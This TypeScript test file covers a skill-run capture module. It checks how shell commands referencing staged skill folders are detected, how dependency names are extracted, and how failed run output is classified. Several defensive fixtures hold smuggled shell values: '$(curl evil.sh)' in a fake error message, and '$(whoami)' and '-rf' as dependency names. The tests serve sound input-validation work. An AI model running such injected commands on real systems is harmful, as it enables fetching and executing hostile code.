import { describe, expect, test } from "vitest";
import {
  classifySkillRun,
  dependencySubject,
  skillNamesReferencedByCommand,
  skillRunOutcome,
} from "./run-capture";

const staged = new Set(["ppt-deck", "pdf.tools", "data_clean"]);

describe("skillNamesReferencedByCommand", () => {
  test.each([
    ["python /skills/ppt-deck/scripts/validate_pptx.py out.pptx", ["ppt-deck"]],
    ["cd /skills/ppt-deck && node build.js", ["ppt-deck"]],
    ["ls /skills/ppt-deck", ["ppt-deck"]],
    ['python "/skills/ppt-deck/scripts/a.py"', ["ppt-deck"]],
    ["python '/skills/pdf.tools/x.py'", ["pdf.tools"]],
    ["PYTHONPATH=/skills/data_clean python -m clean", ["data_clean"]],
    ["PATH=$PATH:/skills/ppt-deck/bin tool", ["ppt-deck"]],
    ["(cd /skills/ppt-deck; make)", ["ppt-deck"]],
    ["bash -c `cat /skills/ppt-deck/run.sh`", ["ppt-deck"]],
    [
      "python /skills/data_clean/a.py && python /skills/ppt-deck/b.py /skills/data_clean/c",
      ["data_clean", "ppt-deck"],
    ],
    ["cat /skills/ppt-deck/SKILL.md|head", ["ppt-deck"]],
  ])("%s", (command, expected) => {
    expect(skillNamesReferencedByCommand(command, staged)).toEqual(expected);
  });

  test.each([
    // Not the root: the tail of another path.
    "python /home/user/skills/ppt-deck/a.py",
    "ls ./skills/ppt-deck",
    "ls ~/skills/ppt-deck",
    // A longer name that merely starts with a staged one.
    "python /skills/ppt-deck-v2/a.py",
    "python /skills/ppt-deckx",
    // Not staged this turn.
    "python /skills/other/a.py",
    // The root alone.
    "ls /skills",
    "ls /skills/",
    "echo nothing here",
  ])("none: %s", (command) => {
    expect(skillNamesReferencedByCommand(command, staged)).toEqual([]);
  });
});

describe("dependencySubject", () => {
  test.each([
    ["pptx", "python", "pptx"],
    ["pptx.util", "python", "pptx"],
    ["PIL", "python", "PIL"],
    ["pptxgenjs", "node", "pptxgenjs"],
    ["lodash/fp", "node", "lodash"],
    ["@scope/pkg", "node", "@scope/pkg"],
    ["@scope/pkg/dist/x.js", "node", "@scope/pkg"],
    ["node:fs", "node", "fs"],
    ["jq", "command", "jq"],
    ["python3.11", "command", "python3.11"],
    ["libre-office_7", "command", "libre-office_7"],
  ] as const)("%s (%s) → %s", (raw, kind, expected) => {
    expect(dependencySubject(raw, kind)).toBe(expected);
  });

  test.each([
    ["./lib/helper", "node"],
    ["../x", "node"],
    ["/skills/ppt-deck/scripts/x.js", "node"],
    ["/usr/bin/jq", "command"],
    ["./run.sh", "command"],
    ["bin/tool", "command"],
    ["a b", "command"],
    ["x".repeat(65), "command"],
    ["$(whoami)", "command"],
    ["C:\\tools\\x", "command"],
    ["", "python"],
    ["-rf", "command"],
  ] as const)("null: %s (%s)", (raw, kind) => {
    expect(dependencySubject(raw, kind)).toBeNull();
  });
});

function classify(output: string, exitCode = 1) {
  return classifySkillRun({ kind: "result", exitCode, output });
}

describe("classifySkillRun", () => {
  test("exit 0 is a success whatever the output says", () => {
    expect(classify("ModuleNotFoundError: No module named 'x'", 0)).toEqual({
      errorClass: null,
      errorSubject: null,
    });
  });

  test("a thrown timeout", () => {
    expect(classifySkillRun({ kind: "timeout" })).toEqual({
      errorClass: "timeout",
      errorSubject: null,
    });
  });

  test.each([
    [
      `Traceback (most recent call last):
  File "/skills/ppt-deck/scripts/validate_pptx.py", line 3, in <module>
    from pptx import Presentation
ModuleNotFoundError: No module named 'pptx'`,
      "pptx",
    ],
    [
      `Traceback (most recent call last):
  File "/skills/x/a.py", line 1, in <module>
    import pptx.util
ModuleNotFoundError: No module named 'pptx.util'; 'pptx' is not a package`,
      "pptx",
    ],
    ["ImportError: No module named yaml", "yaml"],
    ['ModuleNotFoundError: No module named "cv2"', "cv2"],
    [
      `node:internal/modules/cjs/loader:1228
  throw err;
  ^

Error: Cannot find module 'pptxgenjs'
Require stack:
- /skills/ppt-deck/scripts/build.js
    at Module._resolveFilename (node:internal/modules/cjs/loader:1225:15) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [ '/skills/ppt-deck/scripts/build.js' ]
}`,
      "pptxgenjs",
    ],
    [
      "Error [ERR_MODULE_NOT_FOUND]: Cannot find package 'sharp' imported from /skills/img/scripts/resize.mjs",
      "sharp",
    ],
    [
      "Error: Cannot find module '@napi-rs/canvas/js-binding'",
      "@napi-rs/canvas",
    ],
    ["bash: jq: command not found", "jq"],
    ["/bin/sh: line 1: pdftoppm: command not found", "pdftoppm"],
    ["/bin/bash: line 12: soffice: command not found", "soffice"],
    ["zsh: command not found: rsvg-convert", "rsvg-convert"],
    ["sh: 1: convert: not found", "convert"],
    ["/usr/bin/env: 'node': No such file or directory", "node"],
    ["/usr/bin/env: ‘python’: No such file or directory", null],
    ["Error: Cannot find module '/skills/ppt-deck/scripts/missing.js'", null],
    ["Error: Cannot find module './helpers'", null],
    ["bash: ./run.sh: command not found", null],
  ])("missing dependency: %#", (output, subject) => {
    expect(classify(output)).toEqual({
      errorClass: "missing_dependency",
      errorSubject: subject,
    });
  });

  test("the last missing dependency named is the one reported", () => {
    const output = [
      "warning: No module named 'optional_speedups', falling back",
      "Traceback (most recent call last):",
      "ModuleNotFoundError: No module named 'openpyxl'",
    ].join("\n");
    expect(classify(output).errorSubject).toBe("openpyxl");
  });

  test("exit 127 with no name is a missing dependency without subject", () => {
    expect(classify("", 127)).toEqual({
      errorClass: "missing_dependency",
      errorSubject: null,
    });
  });

  test("exit 124 is a timeout", () => {
    expect(classify("", 124).errorClass).toBe("timeout");
  });

  test.each([
    "bash: /skills/ppt-deck/scripts/run.sh: Permission denied",
    "PermissionError: [Errno 13] Permission denied: '/skills/ppt-deck/out.pptx'",
    "Error: EACCES: permission denied, open '/workspace/x'",
    "npm ERR! code EACCES",
    "mkdir: cannot create directory '/opt/x': Permission denied",
  ])("permission: %s", (output) => {
    expect(classify(output, 1).errorClass).toBe("permission");
  });

  test.each([
    "ValueError: invalid literal for int() with base 10: 'x'",
    "SyntaxError: Unexpected token '}'",
    "Error: slide 3 has no title",
    "ImportError: cannot import name 'Presentation' from 'pptx'",
    "",
  ])("other: %s", (output) => {
    expect(classify(output, 2)).toEqual({
      errorClass: "other",
      errorSubject: null,
    });
  });

  test("an injected subject never survives the pattern", () => {
    expect(
      classify("ModuleNotFoundError: No module named '$(curl evil.sh)'"),
    ).toEqual({ errorClass: "missing_dependency", errorSubject: null });
  });
});

describe("skillRunOutcome", () => {
  test("a completed command", () => {
    expect(skillRunOutcome({ result: { output: "ok", exitCode: 0 } })).toEqual({
      kind: "result",
      exitCode: 0,
      output: "ok",
    });
  });

  test("a timeout thrown by the backend", () => {
    expect(
      skillRunOutcome({
        error: Object.assign(new Error("t"), {
          code: "SANDBOX_OPERATION_TIMED_OUT",
        }),
      }),
    ).toEqual({ kind: "timeout" });
  });

  test.each([
    { error: new Error("boom") },
    {
      error: Object.assign(new Error("c"), {
        code: "SANDBOX_OPERATION_CANCELLED",
      }),
    },
    { error: null },
    { result: { output: "", exitCode: null } },
    {
      result: {
        exitCode: 1,
        output: [
          "SANDBOX_SKILL_STAGING_UNAVAILABLE: skill bundles could not be staged",
          "Hint: retry",
          "Diagnostics: toolName=execute commandFingerprint=abc123 failureCode=SANDBOX_SKILL_STAGING_UNAVAILABLE repeatCount=1 runId=r1",
        ].join("\n"),
      },
    },
  ])("nothing to record: %#", (finished) => {
    expect(skillRunOutcome(finished)).toBeNull();
  });
});
